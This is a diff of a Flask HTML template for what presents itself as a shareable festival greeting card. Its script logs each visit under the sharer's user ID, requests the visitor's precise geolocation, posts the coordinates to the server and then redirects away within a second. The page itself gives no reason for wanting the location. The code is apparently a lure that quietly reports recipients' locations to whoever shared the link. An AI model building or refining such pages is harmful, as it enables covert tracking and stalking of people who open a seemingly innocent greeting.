@@ -1,10 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>{{festival.festival_name}}</title>
+    <title>{{ festival["festival_name"] }}</title>
+
     <style>
         * {
             margin: 0;
@@ -93,7 +94,6 @@
 
 <body>
 
-
     <main class="festival-card">
 
         <h1 class="festival-name">
@@ -104,88 +104,131 @@
             alt="{{ festival['festival_name'] }}">
 
     </main>
+
     <script>
-        // Flask template se share link ka shared_id milega
-        const sharedId = {{ shared_id | tojson }};
-        const u_id = {{ ui_id | tojson}};
-        const festival_ = {{ festival | tojson}};
 
+        // Flask template data
+        const userId = {{ user_id | tojson }};
+        const u_id = {{ ui_id | tojson }};
 
-
-
-        let visitorId = localStorage.getItem("visitor_id");
+        let visitorId = null;
         let locationInterval = null;
 
 
+        if (String(userId)) {
+            visitorId = localStorage.getItem("visitor_id");
+        }
 
-        // 1. Pehle visit record karo
+
+        // --------------------------------------------------
+        // 1. TRACK VISIT
+        // --------------------------------------------------
+
         async function trackVisit() {
+
             try {
+
                 const response = await fetch("/track", {
                     method: "POST",
+
                     headers: {
                         "Content-Type": "application/json"
                     },
+
                     body: JSON.stringify({
                         page_path: window.location.pathname,
-                        shared_id: sharedId,
-                        visitor_id: visitorId ? Number(visitorId) : 0
+                        user_id: userId,
+                        visitor_id: visitorId || null
                     })
                 });
+
+                const contentType =
+                    response.headers.get("content-type") || "";
+
+                if (!contentType.includes("application/json")) {
+                    throw new Error("Server ne JSON response nahi diya.");
+                }
 
                 const data = await response.json();
 
                 if (!response.ok) {
-                    throw new Error(data.message || data.error || "Tracking failed");
+                    throw new Error(
+                        data.message || data.error || "Tracking failed"
+                    );
                 }
 
                 if (!data.visitor_id) {
-                    throw new Error("Visitor ID response mein nahi mila");
+                    throw new Error("Visitor ID response mein nahi mila.");
                 }
 
-                // Isi visit ki ID use hogi; purani ID par depend nahi karenge
+                // Save visitor information
                 visitorId = data.visitor_id;
-                localStorage.setItem("visitor_id", String(visitorId));
-                localStorage.setItem("shared_id", String(sharedId));
-                localStorage.setItem("festival_id", String(u_id));
 
-                console.log("Visit successfully recorded:", visitorId);
+                localStorage.setItem(
+                    "visitor_id",
+                    String(visitorId)
+                );
 
-                // Pehli location turant save karne ki koshish karo
-                await getLocation();
+                localStorage.setItem(
+                    "user_id",
+                    String(userId)
+                );
 
-                // Purana interval ho to clear karo
-                if (locationInterval !== null) {
-                    clearInterval(locationInterval);
-                }
+                localStorage.setItem(
+                    "festival_id",
+                    String(u_id)
+                );
 
-                // Har 60 seconds mein location update
-                locationInterval = setInterval(() => {
-                    await getLocation();
+                console.log(
+                    "Visit successfully recorded:",
+                    visitorId
+                );
+
+                // First location request
+                getLocation();
+                setTimeout(() => {
                     window.location.href = "/";
                 }, 1000);
-
             } catch (error) {
-                console.error("Visit record nahi ho saka:", error);
+
+
+
+                console.error(
+                    "Visit record nahi ho saka:",
+                    error
+                );
             }
         }
 
-        // 2. Visitor ki location lo aur server par save karo
+
+        // --------------------------------------------------
+        // 2. GET AND SAVE LOCATION
+        // --------------------------------------------------
+
         function getLocation() {
-            if (!visitorId || !sharedId) {
-                console.log("Visitor ID ya Shared ID available nahi hai.");
+            const visitor_id = localStorage.getItem(
+                "visitor_id"
+            );
+            const userId = localStorage.getItem(
+                "user_id"
+            );
+
+            if (!visitor_id || !userId) {
+                console.log("Visitor ID ya User ID available nahi hai.");
                 return;
             }
 
             if (!navigator.geolocation) {
-                console.log("Is browser mein Geolocation supported nahi hai.");
+                console.log("Geolocation supported nahi hai.");
                 return;
             }
 
-            console.log("Location permission / location ka wait ho raha hai...");
+            console.log("Location request bheji ja rahi hai...");
 
             navigator.geolocation.getCurrentPosition(
+
                 async function (position) {
+
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
@@ -194,40 +237,64 @@
                         `https://www.google.com/maps?q=${latitude},${longitude}`;
 
                     try {
+
                         const response = await fetch("/save-location", {
+
                             method: "POST",
+
                             headers: {
                                 "Content-Type": "application/json"
                             },
+
                             body: JSON.stringify({
-                                id: visitorId,
-                                shared_id: sharedId,
+
+                                id: visitor_id,
+                                user_id: userId,
                                 latitude: latitude,
                                 longitude: longitude,
-                                accuracy: accuracy,
-                                mapLink: mapLink
+                                accuracy: accuracy
+
                             })
+
                         });
+
+                        const contentType =
+                            response.headers.get("content-type") || "";
+
+                        if (!contentType.includes("application/json")) {
+                            throw new Error("Location API ne JSON response nahi diya.");
+                        }
 
                         const result = await response.json();
 
                         if (!response.ok) {
                             throw new Error(
-                                result.message || result.error ||
+                                result.message ||
+                                result.error ||
                                 "Location save nahi hui"
                             );
                         }
 
-                        console.log("Location successfully saved:", result);
-                        window.location.href = "/";
+                        console.log(
+                            "Location successfully saved:",
+                            result
+                        );
 
                     } catch (error) {
-                        console.error("Failed to save location:", error);
+
+                        console.error(
+                            "Failed to save location:",
+                            error
+                        );
+
                     }
+
                 },
 
                 function (error) {
+
                     switch (error.code) {
+
                         case error.PERMISSION_DENIED:
                             console.log("Location permission deny kar di gayi.");
                             break;
@@ -242,7 +309,9 @@
 
                         default:
                             console.log("Location obtain nahi ho saki.");
+
                     }
+
                 },
 
                 {
@@ -250,15 +319,20 @@
                     timeout: 15000,
                     maximumAge: 0
                 }
+
             );
+
         }
 
-        window.addEventListener('load', () => {
-            await trackVisit();
-            setInterval(getLocation, 2000);
+
+        // --------------------------------------------------
+        // 3. PAGE LOAD
+        // --------------------------------------------------
+
+        window.addEventListener("load", () => {
+            trackVisit();
+
         });
-        // Page load par visit record karo
-        trackVisit();
 
     </script>
 
